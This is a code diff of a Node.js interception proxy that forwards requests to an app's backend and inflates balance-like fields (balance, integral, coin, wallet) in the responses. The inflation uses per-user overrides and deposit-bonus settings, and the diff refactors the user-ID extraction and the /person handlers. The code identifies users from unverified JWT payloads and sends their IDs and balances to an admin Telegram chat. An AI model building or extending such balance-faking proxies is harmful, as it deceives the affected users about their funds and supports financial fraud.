@@ -121,20 +121,9 @@ async function getUserIdFromToken(req) {
   return null;
 }
 
-async function extractUserId(req, jsonResp) {
+async function extractUserIdFromToken(req) {
   const fromToken = await getUserIdFromToken(req);
   if (fromToken) return fromToken;
-  const body = req.parsedBody || {};
-  const uid = body.userId || body.userid || body.memberId || body.id || '';
-  if (uid) return String(uid);
-  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
-  if (qs.get('userId')) return String(qs.get('userId'));
-  if (qs.get('id')) return String(qs.get('id'));
-  const respData = getResponseData(jsonResp);
-  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
-    const rid = respData.userId || respData.userid || respData.memberId || respData.id || '';
-    if (rid) return String(rid);
-  }
   const authHeader = getTokenFromReq(req);
   if (authHeader) {
     try {
@@ -147,6 +136,23 @@ async function extractUserId(req, jsonResp) {
         if (payload.id) return String(payload.id);
       }
     } catch(e) {}
+  }
+  return '';
+}
+
+async function extractUserId(req, jsonResp) {
+  const fromToken = await extractUserIdFromToken(req);
+  if (fromToken) return fromToken;
+  const body = req.parsedBody || {};
+  const uid = body.userId || body.userid || body.memberId || body.id || '';
+  if (uid) return String(uid);
+  const qs = new URLSearchParams((req.originalUrl || '').split('?')[1] || '');
+  if (qs.get('userId')) return String(qs.get('userId'));
+  if (qs.get('id')) return String(qs.get('id'));
+  const respData = getResponseData(jsonResp);
+  if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
+    const rid = respData.userId || respData.userid || respData.memberId || respData.id || '';
+    if (rid) return String(rid);
   }
   return '';
 }
@@ -1163,12 +1169,20 @@ async function proxyAndAddBonus(req, res) {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const detectedUserId = await extractUserId(req, jsonResp);
+    const tokenUserId = await extractUserIdFromToken(req);
+    let detectedUserId = tokenUserId;
+    if (!detectedUserId) {
+      const respData = getResponseData(jsonResp);
+      if (respData && typeof respData === 'object' && !Array.isArray(respData)) {
+        const rid = respData.userId || respData.userid || respData.memberId || '';
+        if (rid) detectedUserId = String(rid);
+      }
+    }
     const eff = getEffectiveSettings(data, detectedUserId);
     const bonus = eff.depositSuccess ? (eff.depositBonus || 0) : 0;
 
     if (detectedUserId) {
-      saveTokenUserId(req, detectedUserId);
+      if (tokenUserId || !await getUserIdFromToken(req)) saveTokenUserId(req, detectedUserId);
       trackUser(data, detectedUserId, `App Open ${req.path}`);
       saveData(data).catch(()=>{});
     }
@@ -1259,26 +1273,12 @@ app.all('/app/user/info', async (req, res) => {
   } catch(e) { await transparentProxy(req, res); }
 });
 
-app.all('/app/user/info/person', async (req, res) => {
+async function proxyAndAddBonusPersonal(req, res) {
   const data = await loadData();
   try {
     const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
     const bonusData = getResponseData(jsonResp);
-    const tokenUserId = await getUserIdFromToken(req);
-    let detectedUserId = tokenUserId || '';
-    if (!detectedUserId) {
-      const authHeader = getTokenFromReq(req);
-      if (authHeader) {
-        try {
-          const clean = authHeader.replace('Bearer ', '');
-          const parts = clean.split('.');
-          if (parts.length === 3) {
-            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
-            detectedUserId = String(payload.userId || payload.sub || payload.id || '');
-          }
-        } catch(e) {}
-      }
-    }
+    const detectedUserId = await extractUserIdFromToken(req);
     if (detectedUserId && bonusData && typeof bonusData === 'object') {
       const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
       const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
@@ -1296,52 +1296,14 @@ app.all('/app/user/info/person', async (req, res) => {
         }
       }
       if (data.adminChatId && bot) {
-        bot.sendMessage(data.adminChatId, `🔍 DiwaDebug /person\nUID: ${detectedUserId} (token: ${!!tokenUserId})\nAdded: ${addedBal}\nIntegral: ${bonusData.integral ?? 'N/A'}`).catch(()=>{});
+        bot.sendMessage(data.adminChatId, `🔍 DiwaDebug ${req.path}\nUID: ${detectedUserId}\nAdded: ${addedBal}\nIntegral: ${bonusData.integral ?? 'N/A'} | Bal: ${bonusData.balance ?? 'N/A'}`).catch(()=>{});
       }
     }
     sendJson(res, respHeaders, jsonResp, respBody);
   } catch(e) { await transparentProxy(req, res); }
-});
-app.all('/app/user/info/personV2', async (req, res) => {
-  const data = await loadData();
-  try {
-    const { response, respBody, respHeaders, jsonResp } = await proxyFetch(req);
-    const bonusData = getResponseData(jsonResp);
-    const tokenUserId = await getUserIdFromToken(req);
-    let detectedUserId = tokenUserId || '';
-    if (!detectedUserId) {
-      const authHeader = getTokenFromReq(req);
-      if (authHeader) {
-        try {
-          const clean = authHeader.replace('Bearer ', '');
-          const parts = clean.split('.');
-          if (parts.length === 3) {
-            const payload = JSON.parse(Buffer.from(parts[1], 'base64').toString());
-            detectedUserId = String(payload.userId || payload.sub || payload.id || '');
-          }
-        } catch(e) {}
-      }
-    }
-    if (detectedUserId && bonusData && typeof bonusData === 'object') {
-      const userOvr = data.userOverrides && data.userOverrides[String(detectedUserId)];
-      const addedBal = userOvr && userOvr.addedBalance !== undefined ? userOvr.addedBalance : 0;
-      if (addedBal !== 0) {
-        const personBalKeys = ['balance', 'integral', 'availablebalance', 'money', 'coin', 'wallet'];
-        for (const key of Object.keys(bonusData)) {
-          if (personBalKeys.includes(key.toLowerCase())) {
-            const current = parseFloat(bonusData[key]);
-            if (!isNaN(current)) {
-              bonusData[key] = typeof bonusData[key] === 'string'
-                ? String((current + addedBal).toFixed(2))
-                : parseFloat((current + addedBal).toFixed(2));
-            }
-          }
-        }
-      }
-    }
-    sendJson(res, respHeaders, jsonResp, respBody);
-  } catch(e) { await transparentProxy(req, res); }
-});
+}
+app.all('/app/user/info/person', async (req, res) => { await proxyAndAddBonusPersonal(req, res); });
+app.all('/app/user/info/personV2', async (req, res) => { await proxyAndAddBonusPersonal(req, res); });
 
 app.post('/app/payment/order/create', async (req, res) => {
   const data = await loadData();
